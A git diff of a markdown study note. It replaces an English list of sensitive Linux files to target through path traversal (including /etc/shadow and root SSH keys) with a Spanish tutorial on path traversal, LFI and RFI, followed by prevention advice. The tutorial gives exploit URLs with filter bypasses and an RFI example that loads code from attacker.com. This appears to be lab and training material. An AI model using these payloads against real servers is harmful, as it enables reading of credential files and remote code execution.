@@ -1,62 +1,169 @@
-### Path/Directory Traversal
-For example: 
-http://webapp.thm/get.php?file=../../../../etc/passwd
 
-Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.
+---
 
- 
-Location 	Description
+# Inclusión de Archivos (File Inclusion)
 
-/etc/issue
-	
+Las vulnerabilidades de inclusión de archivos ocurren cuando una aplicación web permite cargar archivos mediante entradas del usuario sin validación adecuada. Esto puede permitir a un atacante acceder a archivos sensibles del sistema o incluso ejecutar código malicioso en el servidor. Se dividen principalmente en:
 
-contains a message or system identification to be printed before the login prompt.
+* **Path Traversal** (travesía de directorios)
+* **Local File Inclusion (LFI)** (inclusión de archivos locales)
+* **Remote File Inclusion (RFI)** (inclusión de archivos remotos)
 
-/etc/profile
-	
+---
 
-controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
+## 1. Path Traversal (Traversal de directorios)
 
-/proc/version
-	
+**Descripción:**
+Permite a un atacante acceder a archivos fuera del directorio raíz de la aplicación web usando secuencias como `../` para subir niveles en el sistema de archivos.
 
-specifies the version of the Linux kernel
+**Ejemplo típico:**
 
-etc/passwd
-	
+```bash
+http://webapp.com/get.php?file=../../../../etc/passwd
+```
 
-has all registered users that have access to a system
+Accede al archivo `/etc/passwd` si no hay validación de entrada.
 
-/etc/shadow
-	
+---
 
-contains information about the system's users' passwords
+## 2. Local File Inclusion (LFI)
 
-/root/.bash_history
-	
+**Descripción:**
+La aplicación incluye archivos locales según un valor proporcionado por el usuario. Si no hay controles adecuados, se pueden leer archivos sensibles del sistema.
 
-contains the history commands for root user
+**Ejemplo básico:**
 
-/var/log/dmessage
-	
+```php
+<?php include($_GET['lang']); ?>
+```
 
-contains global system messages, including the messages that are logged during system startup
+```bash
+http://webapp.com/index.php?lang=/etc/passwd
+```
 
-/var/mail/root
-	
+---
 
-all emails for root user
+### 2.1 LFI con subdirectorios
 
-/root/.ssh/id_rsa
-	Private SSH keys for a root or any known valid user on the server
+```php
+<?php include("languages/" . $_GET['lang']); ?>
+```
 
-/var/log/apache2/access.log
-	
+**Explotación:**
 
-the accessed requests for Apache web server
+```bash
+http://webapp.com/index.php?lang=../../../../etc/passwd
+```
 
-C:\boot.ini
-	contains the boot options for computers with BIOS firmware
+---
+
+### 2.2 LFI con extensión forzada `.php`
+
+Si el código añade automáticamente `.php`:
+
+```php
+include("languages/" . $_GET['lang'] . ".php");
+```
+
+**Falla al intentar:**
+
+```bash
+http://webapp.com/index.php?lang=../../../../etc/passwd
+```
+
+**Bypass usando Null Byte:**
+
+```bash
+http://webapp.com/index.php?lang=../../../../etc/passwd%00
+```
+
+*Nota: `%00` ya no funciona en PHP >= 5.3.4.*
+
+---
+
+### 2.3 LFI con filtros de palabras clave
+
+Si hay filtros que bloquean `/etc/passwd`, se pueden usar:
+
+**Usando `/./` o `/../`:**
+
+```bash
+http://webapp.com/index.php?lang=/etc/passwd/.
+```
+
+**Usando Null Byte:**
+
+```bash
+http://webapp.com/index.php?lang=/etc/passwd%00
+```
+
+---
+
+### 2.4 LFI con reemplazo de `../`
+
+Si el servidor reemplaza `../` por vacío:
+
+**Bypass con secuencias dobles:**
+
+```bash
+http://webapp.com/index.php?lang=....//....//etc/passwd
+```
+
+---
+
+### 2.5 LFI con ruta fija
+
+Si el código fuerza un prefijo:
+
+```php
+include("languages/" . $_GET['lang']);
+```
+
+**Explotación:**
+
+```bash
+http://webapp.com/index.php?lang=../../../../../etc/passwd
+```
+
+---
+
+## 3. Remote File Inclusion (RFI)
+
+**Descripción:**
+Permite incluir archivos externos si la opción `allow_url_fopen` está activada. Puede llevar a ejecución remota de código.
+
+**Ejemplo:**
+
+Archivo malicioso alojado en el servidor del atacante:
+
+```php
+<?php echo "Hola Mundo"; ?>
+```
+
+**Exploit:**
+
+```bash
+http://webapp.com/index.php?lang=http://attacker.com/cmd.txt
+```
+
+El servidor incluirá y ejecutará el archivo remoto.
+
+---
+
+## Recomendaciones para prevenir LFI, RFI y Path Traversal
+
+* No confíes en entradas del usuario.
+* Usa listas blancas de archivos permitidos.
+* Valida y sanitiza entradas rigurosamente.
+* Desactiva funciones innecesarias como `allow_url_fopen` y `allow_url_include`.
+* Mantén actualizado PHP y el sistema.
+* Usa un Web Application Firewall (WAF).
+* Desactiva mensajes de error en producción.
+
+---
+
+¿Deseas este contenido como documento descargable (PDF o Word)?
+
 
 
 ### Transferencia rápida de archivos en entornos de post-explotación
